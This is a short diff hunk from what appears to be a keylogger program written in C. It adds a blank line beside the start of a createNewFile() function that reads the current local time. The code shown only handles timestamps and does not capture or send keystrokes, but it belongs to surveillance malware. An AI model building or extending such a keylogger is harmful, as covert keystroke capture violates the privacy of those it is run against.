@@ -1,4 +1,5 @@
 #include "keylogger.h"
+
 void createNewFile() {
     now = time(NULL);
     tm  = localtime(&now);
